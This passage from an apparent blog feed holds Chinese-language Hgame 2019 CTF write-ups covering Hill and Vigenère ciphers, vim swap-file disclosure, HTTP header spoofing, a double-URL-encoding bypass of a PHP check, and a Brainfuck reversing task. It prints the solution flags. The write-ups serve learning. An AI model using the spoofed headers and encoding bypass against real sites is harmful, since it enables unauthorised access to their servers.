<span class="number">9</span>],</span><br><span class="line">     [<span class="number">21</span>, <span class="number">9</span>, <span class="number">3</span>],</span><br><span class="line">     [<span class="number">14</span>, <span class="number">7</span>, <span class="number">9</span>],</span><br><span class="line">     [<span class="number">4</span>, <span class="number">0</span>, <span class="number">4</span>]]</span><br><span class="line">C = [[<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">     [<span class="number">24</span>, <span class="number">18</span>, <span class="number">7</span>],</span><br><span class="line">     [<span class="number">8</span>, <span class="number">11</span>, <span class="number">11</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    key = np.array(Matrix(P[i:i + <span class="number">3</span>], C).withs).transpose()</span><br><span class="line">    ans = np.dot(key, np.array(P).transpose()).transpose()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> ans:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> line:</span><br><span class="line">            print(chr(ord(<span class="string">'A'</span>) + c % <span class="number">26</span>), end=<span class="string">''</span>)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><p>最后输出是</p><blockquote><p>BABYSHILLZCCEDHMQHBQKYMC<br />THEBABYSHILLCIPHERATTACK</p></blockquote><p>所以flag就是<code>hgame{THEBABYSHILLCIPHERATTACK}</code></p><h4 id="3-vigener~"><a class="markdownIt-Anchor" href="#3-vigener~"></a> 3. Vigener~</h4><h4 id="question-8"><a class="markdownIt-Anchor" href="#question-8"></a> Question</h4><p>Description</p><p>普通的Vigener</p><p>URL</p><p><a href="http://plir4axuz.bkt.clouddn.com/hgame2019/orz/ciphertext.txt" target="_blank" rel="noopener">http://plir4axuz.bkt.clouddn.com/hgame2019/orz/ciphertext.txt</a></p><p>Base Score</p><p>150</p><h4 id="answer-8"><a class="markdownIt-Anchor" href="#answer-8"></a> Answer</h4><p>打开之后最后一句直接引起了我的注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lfey ay ajqmenycpglmqqjzndhrqwpvhtaniz</span><br></pre></td></tr></table></figure><p>这肯定不是一个正常句子，所以我觉得原文就是</p><blockquote><p>flag is …</p></blockquote><p>经过对比</p><blockquote><p>lfey ay ajqmenycpglmqqjzndhrqwpvhtaniz</p><p>flag is</p><p>gues sg</p></blockquote><p>我猜这个Vigener密码的密钥应该就是<code>guess</code></p><p>在线解密之后，前面也变成了正常的英文句子，最后是</p><blockquote><p>flagisgfyuytukxariyydfjlplwsxdbzwvqt</p></blockquote><p>所以flag就是<code>hgame{gfyuytukxariyydfjlplwsxdbzwvqt}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;过年的week2有点咸鱼了。。。&lt;/p&gt;
&lt;h2 id=&quot;i-web&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#i-web&quot;&gt;&lt;/a&gt; Ⅰ WEB&lt;/h2&gt;
&lt;h3 id=&quot;1-easy_php&quot;&gt;&lt;a class=&quot;markdownIt-A
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.rainbowyang.moe/categories/CTF/"/>
    
    
      <category term="WriteUp" scheme="https://blog.rainbowyang.moe/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Writeup of Hgame 2019 Week1</title>
    <link href="https://blog.rainbowyang.moe/post/CTF/Hgame-2019-Writeup-Week1.html"/>
    <id>https://blog.rainbowyang.moe/post/CTF/Hgame-2019-Writeup-Week1.html</id>
    <published>2019-02-16T06:05:54.000Z</published>
    <updated>2020-07-14T08:14:11.370Z</updated>
    
    <content type="html"><![CDATA[<h2 id="i-web"><a class="markdownIt-Anchor" href="#i-web"></a> Ⅰ WEB</h2><h3 id="1-谁吃了我的flag"><a class="markdownIt-Anchor" href="#1-谁吃了我的flag"></a> 1. 谁吃了我的flag</h3><h4 id="question"><a class="markdownIt-Anchor" href="#question"></a> Question</h4><p>Description</p><p>呜呜呜，Mki一起床发现写好的题目变成这样了，是因为昨天没有好好关机吗T_T hint: 据当事人回忆，那个夜晚他正在用vim编写题目页面，似乎没有保存就关机睡觉去了,现在就是后悔，十分的后悔。</p><p>URL</p><p><a href="http://118.25.111.31:10086/index.html" target="_blank" rel="noopener">http://118.25.111.31:10086/index.html</a></p><p>Base Score</p><p>50</p><h4 id="answer"><a class="markdownIt-Anchor" href="#answer"></a> Answer</h4><p>由于Description可知，是vim没有保存。</p><p>所以拿到<a href="http://118.25.111.31:10086/.index.html.swp" target="_blank" rel="noopener">http://118.25.111.31:10086/.index.html.swp</a>文件，</p><p>然后用vim打开，Recover即得：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>谁吃了我的flag???<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>damn...hgame2019 is coming soon, but the stupid Mki haven't finished his web-challenge...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>fine, nothing serious, just give you flag this time...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>the flag is hgame&#123;3eek_diScl0Sure_fRom+wEbsit@&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所以flag就是<code>hgame{3eek_diScl0Sure_fRom+wEbsit@}</code></p><h3 id="2-换头大作战"><a class="markdownIt-Anchor" href="#2-换头大作战"></a> 2. 换头大作战</h3><h4 id="question-2"><a class="markdownIt-Anchor" href="#question-2"></a> Question</h4><p>Description</p><p>想要flag嘛 工具: burpsuite postman hackbar 怎么用去百度，相信你可以的</p><p>URL</p><p><a href="http://120.78.184.111:8080/week1/how/index.php" target="_blank" rel="noopener">http://120.78.184.111:8080/week1/how/index.php</a></p><p>Base Score</p><p>100</p><h4 id="answer-2"><a class="markdownIt-Anchor" href="#answer-2"></a> Answer</h4><p>进入网页后点了一下submit之后，出现了</p><blockquote><p>request method is error.I think POST is better</p></blockquote><p>所以就用Postman进行POST咯。（然后还要添加一个字段want。。。</p><hr /><p>然后最后多了两行</p><blockquote><p><a href="https://www.wikiwand.com/en/X-Forwarded-For" target="_blank" rel="noopener">https://www.wikiwand.com/en/X-Forwarded-For</a></p><p>only localhost can get flag</p></blockquote><p>那么显然这个就和<code>X-Forwarded-For</code>有关了，又看到<code>only localhost can get flag</code>.</p><p>所以在header请求里加上<code>X-Forwarded-For: 127.0.0.1</code></p><hr /><p>最后两行又变成了</p><blockquote><p><a href="https://www.wikiwand.com/en/User_agent" target="_blank" rel="noopener">https://www.wikiwand.com/en/User_agent</a></p><p>please use Waterfox/50.0</p></blockquote><p>所以就是加上<code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; rv:57.0) Gecko/20100101 Waterfox/50.0</code></p><hr /><p>又变成了</p><blockquote><p><a href="https://www.wikiwand.com/en/HTTP_referer" target="_blank" rel="noopener">https://www.wikiwand.com/en/HTTP_referer</a></p><p>the requests should referer from <a href="http://www.bilibili.com" target="_blank" rel="noopener">www.bilibili.com</a></p></blockquote><p>那就再加上<code>Referer: www.bilibili.com</code></p><hr /><p>下一个。。。</p><blockquote><p><a href="https://www.wikiwand.com/en/HTTP_cookie" target="_blank" rel="noopener">https://www.wikiwand.com/en/HTTP_cookie</a></p><p>you are not admin</p></blockquote><p>看来是cookie了呀。</p><p>怎么弄啊。。</p><p>然后就加了个<code>Cookie: not admin</code></p><p>（我也不知道为什么这脑洞这么。。。</p><p>结果出来了<code>hgame{hTTp_HeaDeR_iS_Ez}</code></p><h3 id="3-very-easy-web"><a class="markdownIt-Anchor" href="#3-very-easy-web"></a> 3. very easy web</h3><h4 id="question-3"><a class="markdownIt-Anchor" href="#question-3"></a> Question</h4><p>Description</p><p>代码审计初♂体验</p><p>URL</p><p><a href="http://120.78.184.111:8080/week1/very_ez/index.php" target="_blank" rel="noopener">http://120.78.184.111:8080/week1/very_ez/index.php</a></p><p>Base Score</p><p>100</p><h4 id="answer-3"><a class="markdownIt-Anchor" href="#answer-3"></a> Answer</h4><p>打开拿到了php源码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(strpos(&quot;vidar&quot;,$_GET[&#39;id&#39;])!&#x3D;&#x3D;FALSE)</span><br><span class="line">  die(&quot;&lt;p&gt;干巴爹&lt;&#x2F;p&gt;&quot;);</span><br><span class="line"></span><br><span class="line">$_GET[&#39;id&#39;] &#x3D; urldecode($_GET[&#39;id&#39;]);</span><br><span class="line">if($_GET[&#39;id&#39;] &#x3D;&#x3D;&#x3D; &quot;vidar&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看来想要拿到flag，只要执行到<code>echo $flag;</code>，问题就解决了。</p><p>所以只要输入一个构造好的id就可以了。</p><p>问题是这个id他既不是<code>&quot;vidar&quot;</code>,又要进行<code>urldecode</code>后表示是<code>&quot;vidar&quot;</code>。</p><p>对于<code>&quot;vidar&quot;</code>而言，进行<code>urlencode</code>，其实就是十六进制的ASCII码，所以就是<code>%76%69%64%61%72</code>。</p><p>可是在输入到php时会自动进行一次<code>urldecode</code>,这样的话id拿到的其实还是<code>vidar</code>，</p><p>所以对<code>%76%69%64%61%72</code>在进行一次<code>urlencode</code>，得到</p><p><code>%25%37%36%25%36%39%25%36%34%25%36%31%25%37%32</code></p><p>然后访问<a href="http://120.78.184.111:8080/week1/very_ez/index.php?id=%25%37%36%25%36%39%25%36%34%25%36%31%25%37%32" target="_blank" rel="noopener">http://120.78.184.111:8080/week1/very_ez/index.php?id=%76%69%64%61%72</a>，得到flag为<code>hgame{urlDecode_Is_GoOd}</code></p><h3 id="4-can-u-find-me"><a class="markdownIt-Anchor" href="#4-can-u-find-me"></a> 4. can u find me?</h3><h4 id="question-4"><a class="markdownIt-Anchor" href="#question-4"></a> Question</h4><p>Description</p><p>为什么不问问神奇的十二姑娘和她的小伙伴呢</p><p>学习资料:</p><p><a href="https://www.cnblogs.com/yaoyaojing/p/9530728.html" target="_blank" rel="noopener">https://www.cnblogs.com/yaoyaojing/p/9530728.html</a><br><br /><a href="https://www.cnblogs.com/logsharing/p/8448446.html" target="_blank" rel="noopener">https://www.cnblogs.com/logsharing/p/8448446.html</a><br><br /><a href="https://blog.csdn.net/z929118967/article/details/50384529" target="_blank" rel="noopener">https://blog.csdn.net/z929118967/article/details/50384529</a></p><p>URL</p><p><a href="http://47.107.252.171:8080/" target="_blank" rel="noopener">http://47.107.252.171:8080/</a></p><p>Base Score</p><p>100</p><h4 id="answer-4"><a class="markdownIt-Anchor" href="#answer-4"></a> Answer</h4><p>打开网页，看到</p><blockquote><p>the gate has been hidden</p><p>can you find it? xixixi</p></blockquote><p>(等于没说。。。</p><hr /><p>然后一把打开F12，看到body里面藏着个<code>&lt;a href=&quot;f12.php&quot;&gt;&lt;/a&gt;</code>.</p><p>遂打开<a href="http://47.107.252.171:8080/f12.php" target="_blank" rel="noopener">http://47.107.252.171:8080/f12.php</a>，结果看到</p><blockquote><p>yeah!you find the gate</p><p>but can you find the password?</p><p>please post password to me! I will open the gate for you!</p></blockquote><hr /><p>找了一下，发现了<code>Response Headers</code>里面的东东</p><blockquote><p>HTTP/1.1 200 OK<br />Server: nginx/1.15.8<br />Date: Sun, 27 Jan 2019 14:01:33 GMT<br />Content-Type: text/html; charset=UTF-8<br />Transfer-Encoding: chunked<br />Connection: keep-alive<br />X-Powered-By: PHP/7.2.14<br /><strong>password: woyaoflag</strong></p></blockquote><p>所以<code>password</code>就是<code>woyaoflag</code></p><hr /><p>然后POST这个密码过去，网页变成了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>can u find me?<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>yeah!you find the gate<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>but can you find the password?<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>please post password to me! I will open the gate for you!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>right!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'iamflag.php'</span>&gt;</span> click me to get flag<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后打开<code>iamflag.php</code>，结果这是个302，然后跳转到<code>toofast.php</code>,显示了</p><blockquote><p>aoh,your speed is sososo fast,the flag must have been left in somewhere</p></blockquote><p>显然真正的flag应该就藏在那个被跳过的<code>iamflag.php</code>里面。</p><p>然后用Burp Suite抓包，再发到Repeater里，重发一遍，拿到iamflag.php的Response</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Server: nginx/1.15.8</span><br><span class="line">Date: Mon, 28 Jan 2019 04:55:02 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/7.2.14</span><br><span class="line">location: toofast.php</span><br><span class="line">Content-Length: 132</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>can you find me?<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>flag:hgame&#123;f12_1s_aMazIng111&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么flag就是<code>hgame{f12_1s_aMazIng111}</code></p><h2 id="ii-re"><a class="markdownIt-Anchor" href="#ii-re"></a> Ⅱ RE</h2><h3 id="1-brainfxxker"><a class="markdownIt-Anchor" href="#1-brainfxxker"></a> 1. brainfxxker</h3><h4 id="question-5"><a class="markdownIt-Anchor" href="#question-5"></a> Question</h4><p>Description</p><p>Ouch! What is this? I don’t think that I am pretty good at C++, what a brain fxxker it is!<br />学习资料:<br /><a href="https://zh.wikipedia.org/wiki/Brainfuck" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Brainfuck</a><br /><a href="https://zh.wikipedia.org/zh/ASCII" target="_blank" rel="noopener">https://zh.wikipedia.org/zh/ASCII</a><br />读懂我的代码逻辑答案就出来了<br />补充说明:<br />判定答案是否正确的是 Notice 2，即“不执行 [+.] 这个部分”，不要单纯看有没有输出 orz</p><p>URL</p><p><a href="http://plir4axuz.bkt.clouddn.com/hgame2019/brainfucker.cpp" target="_blank" rel="noopener">http://plir4axuz.bkt.clouddn.com/hgame2019/brainfucker.cpp</a></p><p>Base Score</p><p>100</p><h4 id="answer-5"><a class="markdownIt-Anchor" href="#answer-5"></a> Answer</h4><p>得到源码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Orz... I haven't learnt C++ before.</span></span><br><span class="line"><span class="comment">// It seems like my brain was fxxked by these codes...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Notice:</span></span><br><span class="line"><span class="comment">// 1. the answer is your input when nothing strange was printed</span></span><br><span class="line"><span class="comment">// 2. that is, wrong inputs will encounter with the part "[+.]"</span></span><br><span class="line"><span class="comment">// 3. [!!!] REMEMBER TO WRAP YOUR ANSWER WITH "hgame&#123;" AND "&#125;"</span></span><br><span class="line"><span class="comment">//    [!!!] BEFORE YOU SUBMITTED IT</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// oyiadin, Jan 18, 2019</span></span><br><span class="line"><span class="comment">// enjoy it! ;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> bf &#123;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parser</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  Parser() = <span class="keyword">default</span>;</span><br><span class="line">  ~Parser() = <span class="keyword">default</span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">execute</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;buf)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">protected</span>:</span><br><span class="line">  <span class="keyword">uint8_t</span> data[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">int</span> ptr = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Parser::execute</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;buf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> i = buf.cbegin(); i != buf.cend(); ++i) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (*i) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'&gt;'</span>:</span><br><span class="line">        ++ptr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'&lt;'</span>:</span><br><span class="line">        --ptr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">        ++data[ptr];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">        --data[ptr];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'.'</span>:</span><br><span class="line">        <span class="built_in">putchar</span>(data[ptr]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">','</span>:</span><br><span class="line">        <span class="keyword">while</span> ((data[ptr] = getchar()) == <span class="string">'\n'</span>) ;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'['</span>:</span><br><span class="line">        <span class="keyword">if</span> (!data[ptr]) &#123;</span><br><span class="line">          <span class="keyword">while</span> (*i++ != <span class="string">']'</span>) <span class="keyword">continue</span>;</span><br><span class="line">          --i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">']'</span>:</span><br><span class="line">        <span class="keyword">if</span> (data[ptr]) &#123;</span><br><span class="line">          <span class="keyword">while</span> (*(i<span class="number">-1</span>) != <span class="string">'['</span>) --i;</span><br><span class="line">          --i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  bf::Parser parser;</span><br><span class="line">  parser.execute(<span class="string">",&gt;++++++++++[&lt;----------&gt;-]&lt;++[+.],&gt;+++++++++[&lt;---------&gt;-]&lt;-[+.],&gt;+++++++[&lt;-------&gt;-]&lt;---[+.],&gt;++++++[&lt;------&gt;-]&lt;+++[+.],&gt;++++++++[&lt;----------&gt;-]&lt;++[+.],&gt;++++++++++[&lt;----------&gt;-]&lt;--[+.],&gt;++++++++++[&lt;--------&gt;-]&lt;-----[+.],&gt;++++++++++[&lt;----------&gt;-]&lt;+[+.],&gt;+++++++++[&lt;--------&gt;-]&lt;---[+.]"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后的这一串实际上就是一堆指令，其中<code>,</code>是输入，<code>.</code>是输出，<code>&lt;</code>和<code>&gt;</code>是左移和右移指针<code>ptr</code>，<code>+</code>和<code>-</code>就是数组里的<code>ptr</code>指着的那个值自增和自减。</p><p>因为<code>,</code>是输入的意思，所以对于最后的字符串，其实应该分组成</p><p><code>,&gt;++++++++++[&lt;----------&gt;-]&lt;++[+.]</code></p><p><code>,&gt;+++++++++[&lt;---------&gt;-]&lt;-[+.]</code></p><p><code>,&gt;+++++++[&lt;-------&gt;-]&lt;---[+.]</code></p><p><code>,&gt;++++++[&lt;------&gt;-]&lt;+++[+.]</code></p><p><code>,&gt;++++++++[&lt;----------&gt;-]&lt;++[+.]</code></p><p><code>,&gt;++++++++++[&lt;----------&gt;-]&lt;--[+.]</code></p><p><code>,&gt;++++++++++[&lt;--------&gt;-]&lt;-----[+.]</code></p><p><code>,&gt;++++++++++[&lt;----------&gt;-]&lt;+[+.]</code></p><p><code>,&gt;+++++++++[&lt;--------&gt;-]&lt;---[+.]</code></p><p>要是最后不输出什么奇怪的值，就要让每一行执行到最后一个<code>[</code>的时候，<code>ptr</code>指着的值应该是0，因为只有这样才能跳过最后的<code>[+.]</code>。</p><p>前面的一块操作，比如<code>&gt;++++++++++[&lt;----------&gt;-]</code>，其实就是一个循环，把输入的值减去<code>+</code>乘上后面连着的<code>-</code>的值。</p><p>然后在后面还有一块有若干个<code>+</code>或<code>-</code>，就是在前面循环的基础上，进行加减。</p><p>整理一下格式就是<code>,&gt;{a个+}[&lt;{b个-}&gt;-]&lt;{c个+}[+.]</code>.</p><p>上面的<code>z个+</code>，如果是<code>-</code>号就等于<code>-z</code>。</p><p>所以设输入的值的ASCII码值为X，则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi><mo>−</mo><mi>a</mi><mi>b</mi><mo>+</mo><mi>z</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">X-ab+z=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>，所以<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi><mo>=</mo><mi>a</mi><mi>b</mi><mo>−</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">X=ab-z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span></span>.</p><p>依次算出之后就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//    ",&gt;++++++++++[&lt;----------&gt;-]&lt;++[+.]" //98</span></span><br><span class="line"><span class="comment">//    ",&gt;+++++++++[&lt;---------&gt;-]&lt;-[+.]"    //82</span></span><br><span class="line"><span class="comment">//    